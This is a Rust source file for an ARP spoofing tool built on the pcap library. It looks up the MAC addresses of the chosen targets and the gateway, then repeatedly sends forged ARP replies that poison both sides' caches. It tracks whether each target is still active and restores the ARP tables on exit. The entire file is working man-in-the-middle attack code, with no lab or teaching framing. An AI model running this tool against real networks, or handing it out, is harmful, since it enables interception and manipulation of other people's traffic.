use pcap::{Device, Capture, Error};
use std::process;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};
use std::net::{IpAddr, Ipv4Addr};

#[derive(Clone)]
pub struct Target {
    pub ip: Ipv4Addr,
    pub mac: [u8; 6],
    pub gateway_ip: Ipv4Addr,
    pub gateway_mac: [u8; 6],
    pub active: bool,
    pub last_seen: Instant,
}

enum ArpOp {
    Request,
    Reply,
}

pub fn start_arp_spoofing(interface_name: &str, target_ips: Vec<Ipv4Addr>, gateway_ip: Ipv4Addr) -> Result<(), Error> {
    let our_mac = get_interface_mac(interface_name)?;
    let our_ip = get_interface_ip(interface_name)?;

    let device = Device::list()?
        .into_iter()
        .find(|dev| dev.name == interface_name)
        .expect("Interface not found");

    let cap = Arc::new(Mutex::new(
        Capture::from_device(device)?
            .timeout(100)
            .immediate_mode(true)
            .open()?
            .setnonblock()?
    ));

    let gateway_mac = get_mac(&mut cap.lock().unwrap(), interface_name, gateway_ip)?;

    let mut target_list = Vec::new();
    for target_ip in target_ips {
        let target_mac = get_mac(&mut cap.lock().unwrap(), interface_name, target_ip)?;
        target_list.push(Target {
            ip: target_ip,
            mac: target_mac,
            gateway_ip,
            gateway_mac,
            active: true,
            last_seen: Instant::now(),
        });
    }

    for target in &target_list {
        println!("[*] Spoofing target: {}", target.ip);
        println!("    |- Target MAC: {}", mac_to_string(&target.mac));
        println!("    |- Gateway MAC: {}", mac_to_string(&target.gateway_mac));
    }

    let cap_clone = Arc::clone(&cap);
    let targets_clone = target_list.clone();

    ctrlc::set_handler(move || {
        println!("\n[*] Restoring ARP tables...");
        let mut cap = cap_clone.lock().unwrap();
        for target in &targets_clone {
            restore_arp(&mut cap, target.ip, target.gateway_ip, target.mac, target.gateway_mac)
                .unwrap_or_else(|e| println!("Failed to restore ARP: {}", e));
        }
        process::exit(0);
    }).expect("Error setting Ctrl+C handler");

    let mut first_status_run = true;
    loop {
        {
            let mut cap = cap.lock().unwrap();
            for target in &mut target_list {
                spoof(&mut cap, our_mac, target.ip, target.mac, target.gateway_ip, target.gateway_mac)?;
                send_arp(&mut cap, ArpOp::Request, our_mac, our_ip, [0xff; 6], target.ip)?;
            }
        }

        {
            let mut cap = cap.lock().unwrap();
            loop {
                match cap.next_packet() {
                    Ok(packet) => process_packet(&packet, &mut target_list),
                    Err(Error::TimeoutExpired) => break,
                    Err(e) => {
                        println!("Error reading packet: {}", e);
                        break;
                    }
                }
            }
        }

        let now = Instant::now();
        for target in &mut target_list {
            if now.duration_since(target.last_seen) > Duration::from_secs(10) {
                target.active = false;
            }
        }

        print_statuses(&target_list, &mut first_status_run);
        thread::sleep(Duration::from_secs(2));
    }
}

fn process_packet(packet: &pcap::Packet, targets: &mut [Target]) {
    let data = packet.data;
    if data.len() < 42 || data[12..14] != [0x08, 0x06] { return; }
    let opcode = &data[20..22];
    if opcode != [0x00, 0x02] { return; }

    let sender_mac = &data[22..28];
    let sender_ip = Ipv4Addr::from([data[28], data[29], data[30], data[31]]);
    let target_ip = Ipv4Addr::from([data[38], data[39], data[40], data[41]]);

    for target in targets {
        if sender_ip == target.ip {
            target.last_seen = Instant::now();
            target.active = true;
        }

        if sender_ip == target.gateway_ip && sender_mac == target.gateway_mac.as_slice() {
            if target_ip == target.ip {
                target.active = false;
            }
        }
        if sender_ip == target.ip && sender_mac == target.mac.as_slice() {
            if target_ip == target.gateway_ip {
                target.active = false;
            }
        }
    }
}

fn spoof(cap: &mut Capture<pcap::Active>,
         our_mac: [u8; 6],
         target_ip: Ipv4Addr,
         target_mac: [u8; 6],
         gateway_ip: Ipv4Addr,
         gateway_mac: [u8; 6]) -> Result<(), Error> {
    send_arp(cap, ArpOp::Reply, our_mac, gateway_ip, target_mac, target_ip)?;
    send_arp(cap, ArpOp::Reply, our_mac, target_ip, gateway_mac, gateway_ip)?;
    Ok(())
}

fn send_arp(cap: &mut Capture<pcap::Active>,
           op: ArpOp,
           src_mac: [u8; 6],
           src_ip: Ipv4Addr,
           dst_mac: [u8; 6],
           dst_ip: Ipv4Addr) -> Result<(), Error> {
    let mut packet = Vec::with_capacity(42);
    packet.extend_from_slice(&dst_mac);
    packet.extend_from_slice(&src_mac);
    packet.extend_from_slice(&[0x08, 0x06]);

    let operation = match op {
        ArpOp::Request => 0x0001u16,
        ArpOp::Reply => 0x0002u16,
    }.to_be_bytes();

    packet.extend_from_slice(&[
        0x00, 0x01,
        0x08, 0x00,
        0x06,
        0x04,
        operation[0], operation[1],
    ]);

    packet.extend_from_slice(&src_mac);
    packet.extend_from_slice(&src_ip.octets());
    packet.extend_from_slice(&dst_mac);
    packet.extend_from_slice(&dst_ip.octets());

    cap.sendpacket(&*packet)?;
    Ok(())
}

fn restore_arp(cap: &mut Capture<pcap::Active>,
              target_ip: Ipv4Addr,
              gateway_ip: Ipv4Addr,
              target_mac: [u8; 6],
              gateway_mac: [u8; 6]) -> Result<(), Error> {
    for _ in 0..5 {
        send_arp(cap, ArpOp::Reply, gateway_mac, gateway_ip, target_mac, target_ip)?;
        send_arp(cap, ArpOp::Reply, target_mac, target_ip, gateway_mac, gateway_ip)?;
    }
    Ok(())
}

fn get_mac(cap: &mut Capture<pcap::Active>, iface: &str, ip: Ipv4Addr) -> Result<[u8; 6], Error> {
    let our_mac = get_interface_mac(iface)?;
    let our_ip = get_interface_ip(iface)?;

    send_arp(cap, ArpOp::Request, our_mac, our_ip, [0xff; 6], ip)?;

    let mut attempts = 0;
    let max_attempts = 50;
    while attempts < max_attempts {
        match cap.next_packet() {
            Ok(packet) => {
                if packet.data[12..14] == [0x08, 0x06] && packet.data[20..22] == [0x00, 0x02] {
                    let sender_ip = Ipv4Addr::from(<[u8; 4]>::try_from(&packet.data[28..32]).unwrap());
                    if sender_ip == ip {
                        return Ok(<[u8; 6]>::try_from(&packet.data[22..28]).unwrap());
                    }
                }
            }
            Err(Error::TimeoutExpired) => {
                attempts += 1;
                thread::sleep(Duration::from_millis(100));
                continue;
            }
            Err(e) => return Err(e),
        }
    }
    Err(Error::TimeoutExpired)
}

fn get_interface_ip(interface: &str) -> Result<Ipv4Addr, std::io::Error> {
    let interfaces = pcap::Device::list().unwrap();
    let device = interfaces.into_iter()
        .find(|dev| dev.name == interface)
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "Interface not found"))?;

    let addr = device.addresses
        .iter()
        .find_map(|addr| {
            if let IpAddr::V4(ipv4) = addr.addr {
                Some(ipv4)
            } else {
                None
            }
        })
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "IPv4 address not found"))?;

    Ok(addr)
}

fn get_interface_mac(interface: &str) -> Result<[u8; 6], std::io::Error> {
    let path = format!("/sys/class/net/{}/address", interface);
    let mac_str = std::fs::read_to_string(path)?;
    let mut bytes = [0u8; 6];
    for (i, byte_str) in mac_str.trim().split(':').enumerate() {
        bytes[i] = u8::from_str_radix(byte_str, 16)
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
    }
    Ok(bytes)
}

fn mac_to_string(mac: &[u8; 6]) -> String {
    format!(
        "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
    )
}

fn print_statuses(targets: &[Target], first_run: &mut bool) {
    let num_targets = targets.len();
    if !*first_run {
        print!("\x1B[{}A", num_targets);
    } else {
        *first_run = false;
    }
    for target in targets {
        let status = if target.active { "  Active" } else { "Inactive" };
        let symbol = if target.active { "+" } else { "!" };
        println!("[{}] Target {:15} : {}", symbol, target.ip, status);
    }
}
